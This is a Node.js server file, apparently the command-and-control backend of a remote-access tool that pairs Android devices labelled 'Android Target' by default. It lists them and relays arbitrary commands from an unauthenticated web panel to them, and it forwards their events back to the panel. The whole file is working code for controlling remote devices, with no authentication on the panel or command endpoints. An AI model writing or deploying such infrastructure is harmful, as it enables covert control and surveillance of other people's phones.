/* ============================================================
   LYX SERVER — Railway Ready
   Author: ZAMZZZ
   ============================================================ */

const express = require('express');
const http = require('http');
const path = require('path');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

/* ---------- STATIC ---------- */
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

/* ---------- ROOT ---------- */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

/* ---------- HEALTHCHECK ---------- */
app.get('/health', (req, res) => {
  res.json({ ok: true, uptime: process.uptime() });
});

/* ---------- STATE ---------- */
const pairings = new Map();
const devices  = new Map();
const panels   = new Set();

/* ---------- HELPER ---------- */
function genCode(len = 6){
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const buf = crypto.randomBytes(len);
  let s = '';
  for (let i = 0; i < len; i++) s += chars[buf[i] % chars.length];
  return s;
}
function genDeviceId(){
  return 'DEV-' + crypto.randomBytes(3).toString('hex').toUpperCase();
}
function broadcastToPanels(obj){
  const data = JSON.stringify(obj);
  for (const ws of panels){
    if (ws.readyState === 1) ws.send(data);
  }
}

/* ============================================================
   REST API
============================================================ */
app.post('/api/pair/generate', (req, res) => {
  let code;
  do { code = genCode(6); } while (pairings.has(code));
  pairings.set(code, { createdAt: Date.now(), deviceId: null, used: false });
  setTimeout(() => pairings.delete(code), 10 * 60 * 1000);
  console.log('[PAIR] New code:', code);
  res.json({ ok: true, code });
});

app.get('/api/pair/:code', (req, res) => {
  const code = (req.params.code || '').toUpperCase();
  const entry = pairings.get(code);
  if (!entry) return res.json({ ok: false, reason: 'INVALID' });
  if (entry.used) return res.json({ ok: false, reason: 'USED' });
  res.json({ ok: true });
});

app.get('/api/devices', (req, res) => {
  const list = [];
  for (const [id, d] of devices){
    list.push({ id, name: d.meta.name, os: d.meta.os, pairedAt: d.meta.pairedAt });
  }
  res.json({ ok: true, devices: list });
});

app.post('/api/command', (req, res) => {
  const { device, feature, data } = req.body || {};
  const d = devices.get(device);
  if (!d || d.ws.readyState !== 1){
    return res.json({ ok: false, reason: 'DEVICE_OFFLINE' });
  }
  d.ws.send(JSON.stringify({ type: 'command', feature, data, ts: Date.now() }));
  console.log('[CMD]', device, feature, JSON.stringify(data));
  res.json({ ok: true });
});

/* ============================================================
   WEBSOCKET
============================================================ */
wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.role = null;
  ws.deviceId = null;

  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }

    /* ---------- PANEL ---------- */
    if (msg.type === 'panel_hello'){
      ws.role = 'panel';
      panels.add(ws);
      const list = [];
      for (const [id, d] of devices){
        list.push({ id, name: d.meta.name, os: d.meta.os });
      }
      ws.send(JSON.stringify({ type: 'device_list', devices: list }));
      console.log('[PANEL] Connected');
      return;
    }

    /* ---------- AGENT PAIRING ---------- */
    if (msg.type === 'agent_pair'){
      const code = (msg.code || '').toUpperCase();
      const entry = pairings.get(code);

      if (!entry){
        ws.send(JSON.stringify({ type: 'pair_result', ok: false, reason: 'INVALID_CODE' }));
        return;
      }
      if (entry.used){
        ws.send(JSON.stringify({ type: 'pair_result', ok: false, reason: 'CODE_USED' }));
        return;
      }

      const deviceId = genDeviceId();
      const meta = {
        name: msg.name || 'Android Target',
        os: msg.os || 'Android',
        pairedAt: Date.now()
      };

      entry.used = true;
      entry.deviceId = deviceId;
      ws.role = 'agent';
      ws.deviceId = deviceId;
      devices.set(deviceId, { ws, meta, features: {} });

      ws.send(JSON.stringify({
        type: 'pair_result',
        ok: true,
        deviceId,
        message: 'PAIRING SUCCESS'
      }));

      broadcastToPanels({
        type: 'device_paired',
        device: { id: deviceId, name: meta.name, os: meta.os }
      });

      console.log('[AGENT] Paired:', deviceId, meta.name);
      return;
    }

    /* ---------- AGENT EVENT ---------- */
    if (ws.role === 'agent' && ws.deviceId){
      broadcastToPanels({
        type: 'agent_event',
        deviceId: ws.deviceId,
        payload: msg
      });
      return;
    }
  });

  ws.on('close', () => {
    if (ws.role === 'panel') panels.delete(ws);
    if (ws.role === 'agent' && ws.deviceId){
      devices.delete(ws.deviceId);
      broadcastToPanels({ type: 'device_offline', deviceId: ws.deviceId });
      console.log('[AGENT] Disconnected:', ws.deviceId);
    }
  });
});

setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

/* ---------- START ---------- */
server.listen(PORT, HOST, () => {
  console.log(`\n========================================`);
  console.log(`  LYX SERVER RUNNING`);
  console.log(`  Port: ${PORT}`);
  console.log(`  Domain: https://lyx-server-production-16ea.up.railway.app`);
  console.log(`  Panel : /index.html`);
  console.log(`  Agent : /agent.html`);
  console.log(`========================================\n`);
});
